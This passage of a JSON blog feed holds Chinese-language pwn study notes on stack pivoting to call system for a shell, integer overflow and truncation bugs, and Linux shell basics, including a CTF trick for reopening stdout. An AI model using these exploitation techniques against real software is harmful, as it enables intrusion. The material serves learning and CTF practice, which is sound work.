data-src=\"https://z1.ax1x.com/2023/09/29/pPqZChn.png\" alt=\"\" /></p>\n<p>pop ebp // 将 esp 内的值给 ebp（fake_ebp 的地址给 ebp）<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/29/pPqZGnO.png\" alt=\"\" /></p>\n</li>\n<li>\n<p>ret</p>\n<p>pop eip  // 将 system_plt 给 eip 让它去执行，这里就可以 getshell 了，然后 eip+4 ,【这里也意味着我们要将 system 放在 fake_ebp+4 的地方】</p>\n</li>\n</ol>\n<p>这里我们也可以看见直接用 ret 执行了命令，这相当于我们平常栈溢出利用的 ret, 通过这种方式我们可以在没有执行权限的地方来构造我们的 getshell 代码来执行 (但是不能执行 shellcode，执行方式不同)</p>\n<p>这样我们就完成了栈迁移</p>\n",
            "tags": [
                "pwn",
                "二进制",
                "Linux"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/09/25/pwn/%E4%B8%93%E6%A0%8F/%E6%95%B4%E6%95%B0%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/",
            "url": "https://vvwwvv.cn/2023/09/25/pwn/%E4%B8%93%E6%A0%8F/%E6%95%B4%E6%95%B0%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/",
            "title": "整数安全漏洞",
            "date_published": "2023-09-25T12:15:56.000Z",
            "content_html": "<p>内容参考了《CTF 竞赛权威指南 Pwn 篇》</p>\n<h1 id=\"一-计算机中的整数\"><a class=\"anchor\" href=\"#一-计算机中的整数\">#</a> 一、计算机中的整数</h1>\n<p>计算机中整数通常分为两种，一种为有符号整数，另一种为无符号整数</p>\n<p>c 数据类型</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">//32 位                      最小值～最大值  </span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token keyword\">signed</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">char</span>            <span class=\"token operator\">-</span><span class=\"token number\">128</span>                             <span class=\"token operator\">~</span>                    <span class=\"token number\">127</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span>          <span class=\"token number\">0</span>                                   <span class=\"token operator\">~</span>                     <span class=\"token number\">255</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">short</span>                           <span class=\"token operator\">-</span><span class=\"token number\">32</span>  <span class=\"token number\">768</span>                       <span class=\"token operator\">~</span>                    <span class=\"token number\">32</span>  <span class=\"token number\">767</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span>        <span class=\"token number\">0</span>                                    <span class=\"token operator\">~</span>                    <span class=\"token number\">65</span>  <span class=\"token number\">535</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">int</span>                                <span class=\"token operator\">-</span><span class=\"token number\">2</span>  <span class=\"token number\">147</span>  <span class=\"token number\">483</span>  <span class=\"token number\">648</span>       <span class=\"token operator\">~</span>                    <span class=\"token number\">2</span>  <span class=\"token number\">147</span>  <span class=\"token number\">483</span>  <span class=\"token number\">647</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">unsigned</span>                    <span class=\"token number\">0</span>                                   <span class=\"token operator\">~</span>                    <span class=\"token number\">4</span>  <span class=\"token number\">294</span>  <span class=\"token number\">967</span>  <span class=\"token number\">295</span>  </pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">long</span>                             <span class=\"token operator\">-</span><span class=\"token number\">2</span>  <span class=\"token number\">147</span>  <span class=\"token number\">483</span>  <span class=\"token number\">648</span>      <span class=\"token operator\">~</span>                    <span class=\"token number\">2</span>  <span class=\"token number\">147</span>  <span class=\"token number\">483</span>  <span class=\"token number\">647</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span>           <span class=\"token number\">0</span>                                  <span class=\"token operator\">~</span>                    <span class=\"token number\">4</span> <span class=\"token number\">294</span>  <span class=\"token number\">967</span>  <span class=\"token number\">295</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">//64 位</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token keyword\">signed</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">char</span>            <span class=\"token operator\">-</span><span class=\"token number\">128</span>                             <span class=\"token operator\">~</span>                     <span class=\"token number\">127</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span>           <span class=\"token number\">0</span>                                  <span class=\"token operator\">~</span>                     <span class=\"token number\">255</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">short</span>                            <span class=\"token operator\">-</span><span class=\"token number\">32</span>  <span class=\"token number\">768</span>                      <span class=\"token operator\">~</span>                     <span class=\"token number\">32</span> <span class=\"token number\">767</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span>         <span class=\"token number\">0</span>                                   <span class=\"token operator\">~</span>                     <span class=\"token number\">65</span> <span class=\"token number\">535</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">int</span>                                  <span class=\"token operator\">-</span><span class=\"token number\">2</span> <span class=\"token number\">147</span> <span class=\"token number\">483</span> <span class=\"token number\">648</span>        <span class=\"token operator\">~</span>                     <span class=\"token number\">2</span> <span class=\"token number\">147</span> <span class=\"token number\">483</span> <span class=\"token number\">647</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">unsigned</span>                    <span class=\"token number\">0</span>                                   <span class=\"token operator\">~</span>                     <span class=\"token number\">4</span>  <span class=\"token number\">294</span>  <span class=\"token number\">967</span>  <span class=\"token number\">295</span>  </pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">long</span>                              <span class=\"token operator\">-</span><span class=\"token number\">9</span> <span class=\"token number\">223</span>  <span class=\"token number\">372</span>  <span class=\"token number\">036</span>  <span class=\"token number\">854</span>  <span class=\"token number\">775</span>  <span class=\"token number\">808</span> <span class=\"token operator\">~</span> <span class=\"token number\">9</span> <span class=\"token number\">223</span> <span class=\"token number\">372</span> <span class=\"token number\">036</span> <span class=\"token number\">854</span> <span class=\"token number\">775</span>  <span class=\"token number\">807</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span>          <span class=\"token number\">0</span>                                   <span class=\"token operator\">~</span>                      <span class=\"token number\">18</span> <span class=\"token number\">446</span> <span class=\"token number\">744</span> <span class=\"token number\">073</span>  <span class=\"token number\">709</span>  <span class=\"token number\">551</span> <span class=\"token number\">615</span></pre></td></tr></table></figure><h1 id=\"二-整数安全漏洞\"><a class=\"anchor\" href=\"#二-整数安全漏洞\">#</a> 二、整数安全漏洞</h1>\n<p>整数的异常情况通常有三种， <code>溢出</code> ； <code>回绕</code> ； <code>截断</code></p>\n<h2 id=\"1溢出\"><a class=\"anchor\" href=\"#1溢出\">#</a> 1. 溢出</h2>\n<p>只有 <code>有符号数</code> 才会发生溢出，我们知道，一般计算机中，有符号数的 <code>最高位</code> 代表着 <code>符号位</code> ，用来表示一个数正负，通过两个正数相加或者两个负数相减，进位时使得符号位发生变化，这样就导致了溢出</p>\n<p>有符号整数</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span>max_int <span class=\"token punctuation\">;</span> <span class=\"token comment\">// i=2 147 483 647</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>i<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>                    <span class=\"token comment\">//  i= -2 147 483 648   ，此时会导致上溢出，改变符号位</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">int</span> j<span class=\"token operator\">=</span>min_int  <span class=\"token punctuation\">;</span> <span class=\"token comment\">// j= -2 147 483 648</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>j<span class=\"token operator\">--</span><span class=\"token punctuation\">;</span>                       <span class=\"token comment\">//j=   2 147 483 647      下溢出</span></pre></td></tr></table></figure><h2 id=\"2-回绕\"><a class=\"anchor\" href=\"#2-回绕\">#</a> 2. 回绕</h2>\n<p>无符号的数永远不会溢出，当它达到最大值的时候会回到最小值【并且由上面可以看见，无符号数最小值都为 <code>0</code> 】，因此一个无符号的整数表达式永远也不会得到小于 0 的值</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span>unsign_max_int<span class=\"token punctuation\">;</span>   <span class=\"token comment\">//  i=4  294  967  295 (x86-32,x64-64 相同)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>i<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>                                                        <span class=\"token comment\">//  i=0;  产生回绕</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> j<span class=\"token operator\">=</span>unsign_min_int <span class=\"token punctuation\">;</span>  <span class=\"token comment\">//  j=0;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>j<span class=\"token operator\">--</span> <span class=\"token punctuation\">;</span>                                                        <span class=\"token comment\">//  j=4  294  967  295</span></pre></td></tr></table></figure><h2 id=\"3截断\"><a class=\"anchor\" href=\"#3截断\">#</a> 3. 截断</h2>\n<p>将一个较大宽度的数存入一个宽度较小的操作数中，导致 <code>高位</code> 发生截断</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">0xffff</span> ffff  <span class=\"token operator\">+</span>  <span class=\"token number\">0x0000</span> <span class=\"token number\">0001</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">=</span><span class=\"token number\">0</span>x <span class=\"token number\">0000</span> <span class=\"token number\">0001</span> <span class=\"token number\">0000</span> <span class=\"token number\">0000</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span> <span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">=</span><span class=\"token number\">0</span>x <span class=\"token number\">0000</span> <span class=\"token number\">0000</span>   <span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span>   <span class=\"token comment\">// 这里高位就发生了截断，只保留了低位</span></pre></td></tr></table></figure><p>在整数转换中：</p>\n<p>整数转换是一种用与表示 <code>赋值</code> 、 <code>强制类型转换</code> 、或者 <code>计算结果</code> 值的底层数据类型的转变 (比如出现小数)。当一个宽度类型转向一个更大的宽度类型，往往会保留 <code>数学值</code> ，而反过来就会导致高位丢失。例如把一个 <code>unsigned char</code>  加到一个  <code>sign char</code>  上（高位符号损失）。总的来说会产生两种错误：第一损失值，当宽度转到更小的宽度的类型时会 <code>损失值</code> ；第二损失符号，从 <code>有符号类型转</code> 为 <code>无符号类型</code> 时会损失符号</p>\n<p>整型提升是指当表达式中包含了不同宽度的操作数时，较小宽度的操作数会被提升到和较大操作数一样的宽度，然后再进行计算。</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">int</span> l<span class=\"token operator\">=</span><span class=\"token number\">0xabcddcba</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">short</span> s<span class=\"token operator\">=</span>l<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">char</span> c<span class=\"token operator\">=</span>l<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">// 宽度溢出</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"l=0x%x  (%d bits) \\n ”, l , sizeof(l)*8\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"l=0x%x  (%d bits) \\n \"</span> <span class=\"token punctuation\">,</span> s <span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">8</span>\"<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"l=0x%x  (%d bits) \\n  \"</span><span class=\"token punctuation\">,</span> c <span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">8</span>\"<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">// 整型提升</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"s+c =0x%x  (%d bits) \\n \"</span> <span class=\"token punctuation\">,</span> s<span class=\"token operator\">+</span>c <span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>s<span class=\"token operator\">+</span>c<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">8</span>\"<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\">// 输出结果：</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>l<span class=\"token operator\">=</span><span class=\"token number\">0xabcd</span> <span class=\"token function\">dcba</span> <span class=\"token punctuation\">(</span><span class=\"token number\">32</span> bits<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>s<span class=\"token operator\">=</span> <span class=\"token number\">0xffff</span>  <span class=\"token function\">dcba</span>   <span class=\"token punctuation\">(</span><span class=\"token number\">16</span> bits<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>c<span class=\"token operator\">=</span><span class=\"token number\">0xffff</span>   <span class=\"token function\">ffba</span>     <span class=\"token punctuation\">(</span><span class=\"token number\">8</span>bits<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>s<span class=\"token operator\">+</span>c<span class=\"token operator\">=</span><span class=\"token number\">0xffff</span> <span class=\"token function\">dc74</span> <span class=\"token punctuation\">(</span><span class=\"token number\">32</span> bits<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"3漏洞多发函数\"><a class=\"anchor\" href=\"#3漏洞多发函数\">#</a> 3. 漏洞多发函数</h1>\n<p>整数溢出往往配合着其他类型的缺陷才能有用， <code>size_t</code>  类型的参数（size_t 是 <code>无符号整数类型</code> 的 sizeof（）的结果，会将别的数转化为无符号整型）,  常常被误用而产生整数溢出，然后可能导致缓冲区溢出</p>\n<h2 id=\"1memcpy\"><a class=\"anchor\" href=\"#1memcpy\">#</a> 1.memcpy</h2>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>dest<span class=\"token punctuation\">,</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>src<span class=\"token punctuation\">,</span>size t_n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>memcpy () 函数将 src 所指向的字符串中以 <code>src地址</code> 开始的 <code>前n个字节</code> 复制到 dest 所指的数组中，并返回 <code>dest</code> 。</p>\n<h2 id=\"2strncpy\"><a class=\"anchor\" href=\"#2strncpy\">#</a> 2.strncpy</h2>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token function\">strncpy</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>dest<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>src<span class=\"token punctuation\">,</span><span class=\"token class-name\">size_t</span> n<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>srncpy () 函数从源 <code>src</code>  所指的内存地址的起始位置开始复制 n 个字节到目标 dest 所指的 <code>内存地址</code> 的起始位置中</p>\n<h2 id=\"上面两个函数都有一个类型为-size_t-的参数它是无符号整型的sizeof运算符的结果\"><a class=\"anchor\" href=\"#上面两个函数都有一个类型为-size_t-的参数它是无符号整型的sizeof运算符的结果\">#</a> 上面两个函数都有一个类型为 size_t 的参数，它是无符号整型的 sizeof 运算符的结果。</h2>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> <span class=\"token class-name\">size_t</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure>",
            "tags": [
                "pwn",
                "二进制",
                "Linux"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/09/19/Linux/Linux%E5%91%BD%E4%BB%A4%E5%92%8C%E5%87%BD%E6%95%B0/",
            "url": "https://vvwwvv.cn/2023/09/19/Linux/Linux%E5%91%BD%E4%BB%A4%E5%92%8C%E5%87%BD%E6%95%B0/",
            "title": "Linux(shell)命令和函数",
            "date_published": "2023-09-19T12:05:56.000Z",
            "content_html": "<h1 id=\"1linux执行多个命令shell命令\"><a class=\"anchor\" href=\"#1linux执行多个命令shell命令\">#</a> 1.Linux 执行多个命令（shell 命令）</h1>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"><span>l</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#逐条执行命令</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> <span class=\"token builtin class-name\">echo</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span> <span class=\"token builtin class-name\">echo</span> <span class=\"token number\">3</span>  <span class=\"token comment\">#即使命令执行错误也不影响后面的命令继续执行</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">#前面的成功执行后面才执行</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token number\">1</span> <span class=\"token operator\">&amp;&amp;</span> echoo <span class=\"token number\">2</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token builtin class-name\">echo</span> <span class=\"token number\">3</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token builtin class-name\">echo</span> <span class=\"token number\">4</span> <span class=\"token comment\">#2 出错，不会执行 echo3 ，echo4</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#前一条命令失败然后才继续执行后面的命令</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token number\">1</span> <span class=\"token operator\">||</span> <span class=\"token builtin class-name\">echo</span> <span class=\"token number\">2</span> <span class=\"token operator\">||</span> <span class=\"token builtin class-name\">echo</span> <span class=\"token number\">3</span> <span class=\"token operator\">||</span> <span class=\"token builtin class-name\">echo</span> <span class=\"token number\">4</span>  <span class=\"token comment\">#当第一个执行成功时，后面的就都不会执行；当第一个命令失败时，就开始执行 echo2，后面同理</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">#混合使用分隔符</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token number\">1</span> <span class=\"token operator\">||</span> <span class=\"token builtin class-name\">echo</span> <span class=\"token number\">2</span> <span class=\"token operator\">||</span> <span class=\"token builtin class-name\">echo</span> <span class=\"token number\">3</span> <span class=\"token operator\">&amp;&amp;</span>  <span class=\"token builtin class-name\">echo</span> <span class=\"token number\">4</span>  <span class=\"token comment\"># 因为 || 分隔符，按照 顺序 只要前面三个执行成功一个其他的就不执行，然后执行 echo4（因为 &amp;&amp; 前面的被看作一个整体，一个成功就视为成功，就执行 echo 4）</span></pre></td></tr></table></figure><p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhbmRhb3l1L2FydGljbGUvZGV0YWlscy8xMTcyOTY5MDc=\">https://blog.csdn.net/bandaoyu/article/details/117296907</span></p>\n<h1 id=\"2命令输出重定向\"><a class=\"anchor\" href=\"#2命令输出重定向\">#</a> 2. 命令输出重定向</h1>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"><span>l</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">command</span>  <span class=\"token operator\">></span>  <span class=\"token function\">file</span> <span class=\"token comment\">#将命令执行结果输出到 file 中，命令的输出结果覆盖原有文件的内容（会清空旧内容）</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token builtin class-name\">command</span>  <span class=\"token operator\">>></span>  <span class=\"token function\">file</span> <span class=\"token comment\">#将命令的输出结果输出到 file 文件的原内容的下一行</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token builtin class-name\">command</span>  <span class=\"token operator\">&lt;</span>  <span class=\"token function\">file</span> <span class=\"token comment\"># 将输入重定向到 file</span></pre></td></tr></table></figure><p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucnVub29iLmNvbS9saW51eC9saW51eC1zaGVsbC1pby1yZWRpcmVjdGlvbnMuaHRtbA==\">https://www.runoob.com/linux/linux-shell-io-redirections.html</span></p>\n<h1 id=\"3fork函数\"><a class=\"anchor\" href=\"#3fork函数\">#</a> 3.fork () 函数</h1>\n<p>fork 函数用于创建一个进程，所创建的进程 <strong>复制父进程的代码段 / 数据段 / BSS 段 / 堆 / 栈等所有用户空间信息</strong> ；在内核中操作系统重新为其申请了一个 PCB，并使用父进程的 PCB 进行初始化；</p>\n<p>父进程与子进程的 pid 不同，<strong>执行顺序也不一定，要看系统的进程调度策略</strong></p>\n<p>fork 被调用一次会返回两次（后面的语句也就判断 2 次），返回 0 代表其是子进程，而在父进程中接到的返回值是子进程的 pid，fork 为负值代表出现错误</p>\n<p>fork 调用的一个奇妙之处就是它仅仅被调用一次，却能够返回两次，它可能有三种不同的返回值：</p>\n<ol>\n<li>\n<pre><code>在父进程中，fork返回新创建子进程的进程ID；\n</code></pre>\n</li>\n<li>\n<pre><code>在子进程中，fork返回0；\n</code></pre>\n</li>\n<li>\n<p>如果出现错误，fork 返回一个负值；</p>\n<p>子进程的 fork（）返回值为 0  #第一次返回（不分先后，第一次返回也可能是父进程的 fork）<br />\n父进程的 fork（）返回值为子进程的 pid  #第二次返回</p>\n</li>\n</ol>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Nja2x1di9hcnRpY2xlL2RldGFpbHMvMTA5MTY5OTQx\">https://blog.csdn.net/cckluv/article/details/109169941</span></p>\n<h1 id=\"4linux下的exec命令\"><a class=\"anchor\" href=\"#4linux下的exec命令\">#</a> 4.Linux 下的 exec 命令</h1>\n<ol>\n<li>在一个 shell 里面，执行 <code>exec ls；</code> 那么，当列出了当前目录后，这个 shell 就自己退出了，因为这个 <code>shell进程已被替换为仅仅执行ls命令的一个进程</code> ，执行结束自然也就退出了 。</li>\n<li>exec 文件重定向，可以将文件的重定向就看为是 shell 程序的文件重定向， <code>当exec命令来对文件描述符操作的时候，就不会替换shell，而且操作完成后，还会继续执行接下来的命令。</code></li>\n</ol>\n<p>应用：可以 <code>重新开启标准输出流</code> ：</p>\n<p><code>exec （cat [文件名]）1&gt;&amp;0</code> , 使文件的标准输出流到标准输入里 (在 Linux 系统中文件描述符 <code>1为标准输出流，0为标准输入流，2为标准错误（输出到屏幕）</code> ，而通过 <code>&amp;+文件描述符</code> 的方式可以代替文件名，（这里就指向了该终端，所以结果显示在终端上 <code>因为默认打开一个终端后，0，1，2都指向该终端</code> ）</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vYnVsaC9hcnRpY2xlcy8xMjc2MDYxNy5odG1s\">https://www.cnblogs.com/bulh/articles/12760617.html</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMxMTg2MTIzL2FydGljbGUvZGV0YWlscy84MjE5MDc3Ng==\">https://blog.csdn.net/qq_31186123/article/details/82190776</span></p>\n<h1 id=\"5echo命令\"><a class=\"anchor\" href=\"#5echo命令\">#</a> 5.echo 命令</h1>\n<p>echo 命令是 Linux 中最基本和最常用的命令之一。 传递给  <code>echo</code>  的参数被打印到 <code>标准输出</code> 中。</p>\n<p>echo 通常用于  <code>shell 脚本</code> 中，用于 <code>显示消息</code> 或 <code>输出</code> 其他命令的结果。<br />\n <code>Shell</code>  的  <code>echo</code>  指令与  <code>PHP</code>  的  <code>echo </code> 指令类似，都是用于字符串的输出</p>\n<p><code>echo &quot;test&quot;</code>  与 <code>echo test</code>  效果一致，双引号可以省略</p>\n<h2 id=\"显示结果定向至文件\"><a class=\"anchor\" href=\"#显示结果定向至文件\">#</a> 显示结果定向至文件</h2>\n<p><code>echo &quot;It is a test&quot; &gt; myfile</code></p>\n<h2 id=\"显示命令执行结果\"><a class=\"anchor\" href=\"#显示命令执行结果\">#</a> 显示命令执行结果</h2>\n<p>这里运用的是反双引号</p>\n<pre><code>echo `date`\n</code></pre>\n<p><img data-src=\"https://z1.ax1x.com/2023/10/12/piSgSDU.png\" alt=\"\" /></p>\n<h1 id=\"6-cfilt-命令\"><a class=\"anchor\" href=\"#6-cfilt-命令\">#</a> 6.  <code>c++filt</code>  命令</h1>\n<p>在 C++ 中， 是允许函数重载的， 也就引出了编译器的 name mangling 机制</p>\n<p>c++filt 的作用就是还原函数名字，它可以帮我们查找动态链接库中缺少的函数，还原崩溃堆栈中一大串的函数名字母等等</p>\n<p>查看一个 ida 反编译出来的 c++ 伪代码</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/%E5%9B%BE%E5%BA%8A/%40J%25ZPGFS%29%24S545_LU%249Z3AY.png\" alt=\"\" /></p>\n<p>利用命令 <code>c++filt</code> <br />\n<img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/%E5%9B%BE%E5%BA%8A/BI5T2747GW%29%5BFJ6Q4CGGQ8P.png\" alt=\"\" /></p>\n<p>可以发现将原来的函数还原了，后面的乱序代码原来为  <code>compare</code>  (用作判断相等 <code>==</code> )</p>\n<p>c<ins>filt 命令可以还原 C</ins> 为实现函数重载采用 name mangling 搞出来的奇奇怪怪的函数名<br />\n注册信号回调函数方式：signal (SIGSEGV, show_stack);，SIGSEGV 代表无效的内存引用<br />\n注意 C 语言和 C++ 在编译后函数命名方式的不同，C 语言不支持严格意义的重载，C++ 支持</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy4wMDhjdC50b3AvYmxvZy8yMDIwLzA1LzE2LyVFNCVCRCVCRiVFNyU5NCVBOGMtZmlsdCVFNSU5MSVCRCVFNCVCQiVBNCVFOCVCRiU5OCVFNSU4RSU5RkMtJUU3JUJDJTk2JUU4JUFGJTkxJUU1JTkwJThFJUU3JTlBJTg0JUU1JTg3JUJEJUU2JTk1JUIwJUU1JTkwJThELw==\">http://www.008ct.top/blog/2020/05/16 / 使用 c-filt 命令还原 C - 编译后的函数名 /</span></p>\n",
            "tags": [
                "pwn",
                "二进制",
                "Linux"
            ]
        },
        {
